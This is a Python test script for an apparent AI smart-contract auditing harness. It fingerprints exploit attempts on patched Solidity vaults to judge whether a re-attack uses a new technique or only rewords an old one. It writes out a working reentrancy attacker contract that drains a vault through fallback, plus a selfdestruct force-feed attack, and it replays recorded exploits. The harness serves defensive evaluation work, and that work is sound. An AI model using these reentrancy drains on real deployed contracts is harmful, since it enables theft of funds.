#!/usr/bin/env python3
"""Check 5's "different technique" test (arbiter/technique.py), offline: no LLM request.

At the finals three of five re-attacks were the patched mechanism reworded, and all five
lit check 5 as passed. Every exploit here is composed by the harness exactly as an
agent's run_exploit would be, built and traced with forge; attempts run against the
PATCHED contract, as a re-attack's do.

  reworded   TwoDoor E_ALL vs E_ALL reworded (fallback instead of receive, renamed
             variables) on the patch            -> same
  new_entry  E_ALL vs E_ONE (the other door) on the patch that closed only E_ALL's
                                                -> new_entry
  new_class  E_ALL vs a selfdestruct force-feed into the vault  -> new_class (and the
             finals exploit's own selfdestruct, which funds the ATTACKER, is no force-feed)
  static     reworded E_ALL and E_ONE that do not compile, judged from source alone
                                                -> same / new_entry
  finals     the 11/07 finals StakingVault exploit (job 20261107-091855-02ed53, read
             from its results file) vs "re-enter unstake via fallback" on the finals'
             own accepted patch                 -> same (check 5 had said 通過)
  liveness   the r2 buyback liveness_broken exploit vs the same sell() from an EOA
             -> same; vs an EOA calling setPrice instead -> new_entry
  against    against several known attacks the weakest answer wins
  reattack   patch.reattack() with agent.audit replaced: the brief reaches the agent
             through proposals (diff + mechanism, no false "FAILED" sentence), every
             attempt is fingerprinted, all-same -> one follow-up audit listing them;
             a new technique -> no follow-up
  repair     repair() end to end: a re-attack that only rewords -> check 5 not_diverse,
             patch still accepted, labels in gate.json / PR comment say so; a new
             technique -> pass; a proven re-attack is labelled by its novelty and joins
             the known attacks the next re-attack is judged against

    python3 scripts/technique_probe.py [--finals PATH] [--liveness PATH]
"""

from __future__ import annotations

import argparse
import json
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

import reattack_probe as rp  # noqa: E402

from arbiter import agent as agent_mod  # noqa: E402
from arbiter import gate, prgate  # noqa: E402
from arbiter import patch as patch_mod  # noqa: E402
from arbiter.patch import apply_diff, exploit_from_row  # noqa: E402
from arbiter.technique import fingerprint_poc, novelty, novelty_against, static_fingerprint  # noqa: E402
from arbiter.tools import AgentOutcome, PocRecord, _test_passed  # noqa: E402
from arbiter.workspace import Workspace  # noqa: E402

RUNS = Path(__file__).resolve().parent.parent / "runs"
FINALS = RUNS / "gate" / "web-20261107-091855-02ed53" / "web-20261107-091855-02ed53.results.jsonl"
FINALS_GATE = RUNS / "gate" / "jobs" / "20261107-091855-02ed53" / "gate.json"
LIVENESS = (Path.home() / "innoserve" / "eval-worktree" / "arbiter" / "runs"
            / "gptoss-v3-r2.results.jsonl")
LIVENESS_SAMPLE = "V_unchecked_call_return_buyback"

# E_ALL in other words: fallback instead of receive, other names, an extra guard.
E_ALL_REWORDED = dict(rp._COMMON, attacker_code="""
contract Attacker {
    TwoDoorVault public vault;
    uint256 public depth;
    constructor(address where) payable { vault = TwoDoorVault(payable(where)); }
    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdrawAll();
    }
    fallback() external payable {
        if (depth < 8 && address(vault).balance >= 1 ether) { depth += 1; vault.withdrawAll(); }
    }
}
""")
# Ether forced into the vault by a helper's selfdestruct; no re-entry at all.
FORCE_FEED = dict(rp._COMMON, attacker_code="""
contract Bomb {
    constructor() payable {}
    function boom(address payable to) external { selfdestruct(to); }
}
contract Attacker {
    TwoDoorVault public v;
    constructor(address _v) payable { v = TwoDoorVault(payable(_v)); }
    function attack() external {
        Bomb b = new Bomb{value: 1 ether}();
        b.boom(payable(address(v)));
        v.deposit{value: 1 ether}();
        v.withdrawAll();
    }
    receive() external payable {}
}
""")

results: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, detail: str) -> None:
    results.append((name, ok, detail))
    print(f"  [{'OK  ' if ok else 'WRONG'}] {name:10s} {detail}")


class Traced:
    """Compose (or take) an exploit, build it against `source`, fingerprint it."""

    def __init__(self, root: Path) -> None:
        self.root = root
        self.n = 0

    def ws(self, source: str) -> Workspace:
        self.n += 1
        return Workspace(self.root, f"w{self.n}", source)

    def victim(self, source: str, spec: dict[str, Any]) -> dict[str, Any]:
        ws = self.ws(source)
        return self.solidity(ws, ws.compose_victim_loss(**spec), source)

    def solidity(self, ws: Workspace, sol: str, source: str) -> dict[str, Any]:
        name = ws.write_poc("Probe", sol)
        if not ws.build().ok:
            raise RuntimeError(f"probe exploit does not build in {ws.root}")
        return fingerprint_poc(ws, name, sol, source)


def short(fp: dict[str, Any] | None) -> str:
    if not fp:
        return "none"
    return (f"{fp['source']} entry={fp['entry']} reentry={fp['reentry']} "
            f"classes={fp['classes']}")


# -- a fake agent.audit that runs scripted exploits through the real harness -------------

def fake_audit(script: list[tuple[dict[str, Any], str]], calls: list[dict[str, Any]]):
    """Each call takes the next list of (victim_loss spec, hypothesis) and runs them in the
    re-attack's own workspace, as run_exploit would; proven if one passes."""
    def audit(gateway: Any, ws: Workspace, *, max_turns: int = 26, ruled_out: Any = None,
              proposals: str = "", **_: Any) -> AgentOutcome:
        calls.append({"max_turns": max_turns, "ruled_out": ruled_out, "proposals": proposals})
        out = AgentOutcome(turns=3, stop_reason="concluded_safe", verdict="safe")
        for i, (spec, hyp) in enumerate(script.pop(0)):
            sol = ws.compose_victim_loss(**spec)
            name = ws.write_poc(f"Scripted{len(calls)}x{i}Exploit", sol)
            built = ws.build()
            passed = built.ok and _test_passed(ws.run_poc(name))
            out.pocs.append(PocRecord(name, hyp, sol, built.ok, passed, "", adjudicated=True,
                                      predicate="victim_loss"))
            if passed:
                out.verdict, out.stop_reason = "vulnerable", "submitted"
                out.findings.append({"poc_name": name, "title": hyp,
                                     "vulnerable_function": "withdraw"})
                break
        return out
    return audit


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--finals", default=str(FINALS))
    ap.add_argument("--liveness", default=str(LIVENESS))
    a = ap.parse_args()
    root = Path(tempfile.mkdtemp(prefix="technique-probe-"))
    tr = Traced(root)
    real_audit = agent_mod.audit
    try:
        e_all = tr.victim(rp.V, rp.E_ALL_SPEC)
        reworded = tr.victim(rp.P_BOTH, E_ALL_REWORDED)
        nv = novelty(e_all, reworded)
        check("reworded", nv == "same" and e_all["reentry"] == ["withdrawAll() -> withdrawAll()"]
              and reworded["reentry"] == e_all["reentry"]
              and any(c.endswith("receive/fallback") for c in reworded["callbacks"]),
              f"{nv}; original {short(e_all)}; reworded on P_BOTH {short(reworded)}")

        e_one = tr.victim(rp.P_ALL, rp.E_ONE_SPEC)
        nv = novelty(e_all, e_one)
        check("new_entry", nv == "new_entry"
              and e_one["reentry"] == ["withdraw(uint256) -> withdraw(uint256)"],
              f"{nv}; E_ONE on P_ALL {short(e_one)}")

        ff = tr.victim(rp.P_BOTH, FORCE_FEED)
        nv = novelty(e_all, ff)
        check("new_class", nv == "new_class" and ff["force_feed"] and ff["classes"] == ["force_feed"]
              and not e_all["force_feed"], f"{nv}; force-feed on P_BOTH {short(ff)}")

        broken_all = Workspace(root, "s1", rp.P_BOTH).compose_victim_loss(
            **E_ALL_REWORDED).replace("depth += 1;", "depth += ;")
        broken_one = Workspace(root, "s2", rp.P_ALL).compose_victim_loss(
            **rp.E_ONE_SPEC).replace("hits++;", "hits+++;")
        s_all, s_one = static_fingerprint(broken_all, rp.P_BOTH), static_fingerprint(broken_one, rp.P_ALL)
        n1, n2 = novelty(e_all, s_all), novelty(e_all, s_one)
        check("static", n1 == "same" and n2 == "new_entry" and s_all["source"] == "static"
              and s_all["hook_calls"] == ["withdrawAll"] and s_one["hook_calls"] == ["withdraw"],
              f"reworded {n1} (hooks call {s_all['hook_calls']}); other door {n2} "
              f"(hooks call {s_one['hook_calls']})")

        # The finals: the recorded exploit on the original, a fallback variant on the patch
        # the finals accepted (both read from runs/, never written).
        fin_path = Path(a.finals)
        if not fin_path.is_file() or not FINALS_GATE.is_file():
            check("finals", False, f"recording not found: {fin_path}")
        else:
            row = json.loads(fin_path.read_text(encoding="utf-8").splitlines()[0])
            ex = exploit_from_row(row)
            diff = json.loads(FINALS_GATE.read_text(encoding="utf-8"))[
                "files"][0]["findings"][0]["patch"]["diff"]
            patched, err = apply_diff(ex["source"], diff)
            orig = tr.solidity(tr.ws(ex["source"]), ex["solidity"], ex["source"])
            variant = (ex["solidity"].replace("receive() external payable", "fallback() external payable")
                       .replace("reentered", "again"))
            att = tr.solidity(tr.ws(patched or ""), variant, patched or "")
            nv = novelty(orig, att)
            # The same exploit as repair() measures it in repo mode (the target is
            # StakingVault.sol in a copy of the recorded project, not src/Target.sol).
            repo = exploit_from_row(row, project=True)["repo"]
            in_repo = patch_mod.reproduce(ex["source"], ex["solidity"], root, "finals_repo",
                                          repo=repo, with_project_tests=False,
                                          fingerprint=True).get("fingerprint") or {}
            check("finals", nv == "same" and orig["reentry"] == ["unstake() -> unstake()"]
                  and not orig["force_feed"] and orig["classes"] == ["reentrancy"] and not err
                  and in_repo.get("reentry") == orig["reentry"],
                  f"{nv}; finals exploit {short(orig)}; via fallback on the finals patch "
                  f"{short(att)}; repo mode {short(in_repo)}")

        live_path = Path(a.liveness)
        row = next((json.loads(x) for x in (live_path.read_text(encoding="utf-8").splitlines()
                                            if live_path.is_file() else [])
                    if json.loads(x).get("sample_id") == LIVENESS_SAMPLE), None)
        if row is None:
            check("liveness", False, f"recording not found: {live_path}")
        else:
            ex = exploit_from_row(row)
            orig = tr.solidity(tr.ws(ex["source"]), ex["solidity"], ex["source"])
            deploy = ("GovToken token = new GovToken(1000 ether);\n"
                      "BuybackPool target = new BuybackPool{value: 1 ether}(address(token));")
            call = 'abi.encodeWithSignature("sell(uint256)", 1 ether)'
            outs = []
            for body in ("uint256 amount = (address(target).balance * 1e18) / "
                         "target.priceWeiPerToken();\ntarget.sell(amount);",
                         "target.setPrice(1);"):
                ws = tr.ws(ex["source"])
                sol = ws.compose_exploit(deploy_code=deploy, predicate="liveness_broken",
                                         liveness_call=call, attack_body=body, mode="eoa",
                                         require_honest=False)
                outs.append(tr.solidity(ws, sol, ex["source"]))
            n1, n2 = novelty(orig, outs[0]), novelty(orig, outs[1])
            check("liveness", n1 == "same" and n2 == "new_entry" and orig["mode"] == "contract"
                  and outs[0]["mode"] == "eoa" and orig["entry"] == ["sell(uint256)"],
                  f"EOA rewording {n1}, setPrice {n2}; original {short(orig)}; "
                  f"EOA {short(outs[0])}; setPrice {short(outs[1])}")

        n1 = novelty_against([e_all, e_one], reworded)
        n2 = novelty_against([e_all, None], ff)
        n3 = novelty_against([e_all], ff)
        check("against", (n1, n2, n3) == ("same", "unknown", "new_class"),
              f"reworded vs [E_ALL, E_ONE] {n1}; force-feed vs [E_ALL, unmeasured] {n2}; "
              f"vs [E_ALL] {n3}")

        # reattack(): the brief, the attempts, the follow-up.
        exploit = {"source": rp.V, "solidity": "", "poc_name": "AllDoorPoc", "sample_id": "td",
                   "hypothesis": "re-enter withdrawAll before the balance is cleared",
                   "repo": None, "layout": None}
        known = [{"hypothesis": exploit["hypothesis"], "fingerprint": e_all}]
        calls: list[dict[str, Any]] = []
        agent_mod.audit = fake_audit([[(E_ALL_REWORDED, "re-enter withdrawAll via fallback")],
                                      [(FORCE_FEED, "force ether in with selfdestruct")]], calls)
        ra = patch_mod.reattack(rp.FakeGateway([]), exploit, rp.P_BOTH, root=root / "ra1",
                                ruled_out=[exploit["hypothesis"]], max_turns=16, known=known)
        brief = calls[0]["proposals"] if calls else ""
        ok = (len(calls) == 2 and all(c["ruled_out"] is None for c in calls)
              and "RE-ATTACK OF A PATCHED CONTRACT" in brief and "+        balanceOf[msg.sender] = 0;" in brief
              and "re-entry withdrawAll() -> withdrawAll()" in brief
              and "already ran the exploits below" in calls[1]["proposals"]
              and "Scripted1x0ExploitPoc" in calls[1]["proposals"] and calls[1]["max_turns"] == 13
              and ra["status"] == "not_proven" and ra["novel"] is True and ra["audits"] == 2
              and [x["novelty"] for x in ra["attempts"]] == ["same", "new_class"]
              and ra["turns"] == 6)
        check("reattack", ok, f"audits {len(calls)} (ruled_out={[c['ruled_out'] for c in calls]}), "
              f"follow-up budget {calls[1]['max_turns'] if len(calls) > 1 else '-'}, attempts "
              f"{[x['novelty'] for x in ra.get('attempts', [])]}, novel={ra.get('novel')}")
        calls.clear()
        agent_mod.audit = fake_audit([[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")]], calls)
        ra = patch_mod.reattack(rp.FakeGateway([]), exploit, rp.P_BOTH, root=root / "ra2",
                                ruled_out=[exploit["hypothesis"]], max_turns=16, known=known)
        check("reattack", len(calls) == 1 and ra["novel"] is True
              and [x["novelty"] for x in ra["attempts"]] == ["new_entry"],
              f"a new door on the first audit: audits {len(calls)}, attempts "
              f"{[x['novelty'] for x in ra['attempts']]}")

        # repair() end to end, the original exploit composed by the harness.
        rexploit = {**exploit, "solidity": Workspace(root, "c1", rp.V).compose_victim_loss(
            **rp.E_ALL_SPEC)}
        cases = [
            ("not_diverse", [rp.P_BOTH], [[(E_ALL_REWORDED, "re-enter withdrawAll via fallback")],
                                          [(E_ALL_REWORDED, "re-enter withdrawAll again")]]),
            ("pass", [rp.P_BOTH], [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")]]),
            ("proven", [rp.P_ALL, rp.P_BOTH], [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")],
                                               [(rp.E_ONE_SPEC, "withdraw(amount) once more")],
                                               [(rp.E_ONE_SPEC, "withdraw(amount) yet again")]]),
        ]
        for name, patches, script in cases:
            calls = []
            agent_mod.audit = fake_audit(script, calls)
            gw = rp.FakeGateway(patches)
            rec = patch_mod.repair(gw, rexploit, root=root / f"rep_{name}", rounds=1,
                                   reattack_turns=16)
            view = gate._timeline(rec, 16)
            c5 = rec["checks"].get("5", {}).get("status")
            labels = [e["label"] for e in view["timeline"]]
            md = "\n".join(prgate._rounds_markdown({**view, "gate_checks": {
                "5": view["reattack"]["status"]}}))
            fp0 = (rec["timeline"][0].get("fingerprint") or {}).get("reentry")
            if name == "not_diverse":
                ok = (rec["status"] == "accepted" and c5 == "not_diverse"
                      and view["reattack"]["novel"] is False
                      and "沒有換手法" in view["reattack"]["label"] and "沒有換手法" in labels[-1]
                      and "AI 沒有換手法（不算通過）" in md and "比對了" in md
                      and fp0 == ["withdrawAll() -> withdrawAll()"] and len(calls) == 2)
            elif name == "pass":
                ok = (rec["status"] == "accepted" and c5 == "pass" and view["reattack"]["novel"]
                      and labels[-1].startswith("換手法攻擊：未成功") and len(calls) == 1)
            else:
                # A1 proven -> D1 P_ALL -> A2 proves E_ONE (a new door) -> D2 P_BOTH -> A3
                # reruns E_ONE, which is now a KNOWN attack: same, so not_diverse.
                ra2 = rec["reattacks"][0]
                ok = (rec["status"] == "accepted" and ra2["status"] == "proven"
                      and ra2["novelty"] == "new_entry" and "同類手法換個入口" in labels[2]
                      and c5 == "not_diverse"
                      and [x["novelty"] for x in rec["reattacks"][1]["attempts"]] == ["same", "same"]
                      and "withdraw(uint256) -> withdraw(uint256)" in calls[1]["proposals"]
                      and "mechanism (from its trace)" in str(gw.seen[-1][-1].get("content")))
            check("repair", ok, f"{name}: status={rec['status']} check5={c5} labels={labels[1:]} "
                                f"audits={len(calls)}")
    finally:
        agent_mod.audit = real_audit
        shutil.rmtree(root, ignore_errors=True)
    good = sum(ok for _, ok, _ in results)
    print(f"\n{good}/{len(results)} as expected")
    return 0 if good == len(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
